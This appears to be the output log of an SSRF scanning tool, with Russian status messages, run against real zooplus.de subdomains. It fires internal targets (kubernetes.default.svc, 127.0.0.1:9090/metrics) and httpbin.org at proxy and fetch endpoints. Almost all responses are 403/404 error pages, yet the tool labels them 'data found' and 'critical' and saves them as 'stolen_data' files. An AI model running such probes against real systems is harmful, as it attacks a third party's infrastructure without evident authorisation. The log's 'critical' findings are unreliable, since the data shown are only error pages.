+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[*] Прогресс: 300/459 тестов выполнено...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: release-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[*] Прогресс: 350/459 тестов выполнено...
+[*] Прогресс: 400/459 тестов выполнено...
+[*] Прогресс: 450/459 тестов выполнено...
+
+================================================================================
+РЕЗУЛЬТАТЫ
+================================================================================
+
+[+] Протестировано: 459 комбинаций
+[+] Найдено интересных результатов: 214
+
+================================================================================
+КРИТИЧЕСКОЕ: НАЙДЕНЫ ПОДДОМЕНЫ КОТОРЫЕ ОТРАЖАЮТ ДАННЫЕ!
+================================================================================
+
+[1] Subdomain: www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_1.txt
+
+[2] Subdomain: www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_2.txt
+
+[3] Subdomain: www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_3.txt
+
+[4] Subdomain: www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_4.txt
+
+[5] Subdomain: www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_5.txt
+
+[6] Subdomain: www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
